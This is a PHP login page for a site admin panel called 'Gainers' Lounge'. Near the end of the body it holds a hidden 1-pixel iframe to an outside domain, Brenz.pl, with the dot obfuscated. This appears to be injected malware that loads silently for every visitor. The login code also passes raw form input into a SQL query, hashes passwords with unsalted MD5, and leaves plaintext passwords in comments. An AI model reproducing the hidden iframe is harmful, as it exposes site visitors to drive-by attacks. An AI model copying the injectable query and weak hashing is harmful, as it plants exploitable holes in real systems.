<?php
session_start();
if (isset($_SESSION['username'])) {
	echo "<script>window.open('index.php','_self')</script>";
}
// echo md5("ponzipassword");
include 'inc/config.php';
$title = 'Login';
// echo md5("password_gainers");
?>
<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8" />
	<link rel="apple-touch-icon" sizes="76x76" href="assets/img/apple-icon.png">
	<link rel="icon" type="image/png" href="assets/img/favicon.png">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />

	<title>Gainers' Lounge | <?php echo $title ?></title>

	<meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />

	<!--     Fonts and icons     -->
	<!-- <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons" />
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700" />
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" /> -->
	<link type="text/css" rel="stylesheet" href="assets/fonts/font-awesome.min.css?1422529194" />
	<link type="text/css" rel="stylesheet" href="assets/fonts/material-design-iconic-font.min.css?1421434286" />

	<!-- CSS Files -->
    <link href="assets/css/bootstrap.min.css" rel="stylesheet" />
    <link href="assets/css/material-kit.css" rel="stylesheet"/>

</head>

<body class="signup-page">
	<nav class="navbar navbar-transparent navbar-absolute">
    	<div class="container">
        	<!-- Brand and toggle get grouped for better mobile display -->
        	<div class="navbar-header">
        		<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navigation-example">
            		<span class="sr-only">Toggle navigation</span>
		            <span class="icon-bar"></span>
		            <span class="icon-bar"></span>
		            <span class="icon-bar"></span>
        		</button>
        		<a class="navbar-brand" href="http://www.creative-tim.com"><i class="md md-add-circle md-2x"></i> <i class="md md-account-circle md-2x"></i></a>
        	</div>

        	<div class="collapse navbar-collapse" id="navigation-example">
        		<ul class="nav navbar-nav navbar-right">
    				<li>
    					<a href="../">
    						User Portal
    					</a>
    				</li>
        		</ul>
        	</div>
    	</div>
    </nav>

    <div class="wrapper">
		<div class="header header-filter" style="background-image: url('assets/img/bg.jpg'); background-size: cover; background-position: top center;">
			<div class="container">
				<div class="row">
					<div class="col-md-6 col-md-offset-3 col-sm-8 col-sm-offset-2">
						<div class="card card-signup">
							<form method="post" action="#">
								<div class="header header-primary text-center">
									<h4>SIGN IN</h4>
								</div>
								<div class="content">

									<div class="input-group">
										<span class="input-group-addon">
											<i class="md md-account-circle md-2x"></i>
										</span>
										<input type="text" class="form-control" name="username" placeholder="Username">
									</div>

									<div class="input-group">
										<span class="input-group-addon">
											<i class="md md-lock md-2x"></i>
										</span>
										<input type="password" placeholder="Password" name="password" class="form-control" />
									</div>

									<!-- If you want to add a checkbox to this form, uncomment this code

									<div class="checkbox">
										<label>
											<input type="checkbox" name="optionsCheckboxes" checked>
											Subscribe to newsletter
										</label>
									</div> -->
								</div>
								<div class="footer text-center">
									<button name="login" class="btn btn-primary btn-md">Login</button>
								</div>
							</form>
							<?php
								if (isset($_POST['login'])) {
									$username = $_POST['username'];
									$password = $_POST['password'];
									$password = md5($password);
									$check = mysql_query("SELECT * FROM admin WHERE username = '$username' AND password = '$password'");
									if (mysql_num_rows($check)) {
										$_SESSION['username'] = $username;
										echo "<script>window.open('index.php','_self')</script>";
									}else{
										echo "<script>alert('Incorrect Login Details')</script>";
										echo "<script>window.open('login.php','_self')</script>";
									}
								}
							?>
						</div>
					</div>
				</div>
			</div>

			<footer class="footer">
		        <div class="container">
		            <nav class="pull-left">
						<ul>
							<li><a href=""><i class="fa fa-paper-plane"></i> Telegram us</a></li>
						</ul>
		            </nav>
		            <div class="copyright pull-right">
		                &copy; 2017 <a href="index.php"><b>Gainers' Lounge</b></a>
		            </div>
		        </div>
		    </footer>

		</div>

    </div>


<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
	<!--   Core JS Files   -->
	<script src="assets/js/jquery.min.js" type="text/javascript"></script>
	<script src="assets/js/bootstrap.min.js" type="text/javascript"></script>
	<script src="assets/js/material.min.js"></script>

	<!--  Plugin for the Sliders, full documentation here: http://refreshless.com/nouislider/ -->
	<script src="assets/js/nouislider.min.js" type="text/javascript"></script>

	<!--  Plugin for the Datepicker, full documentation here: http://www.eyecon.ro/bootstrap-datepicker/ -->
	<script src="assets/js/bootstrap-datepicker.js" type="text/javascript"></script>

	<!-- Control Center for Material Kit: activating the ripples, parallax effects, scripts from the example pages etc -->
	<script src="assets/js/material-kit.js" type="text/javascript"></script>

</html>
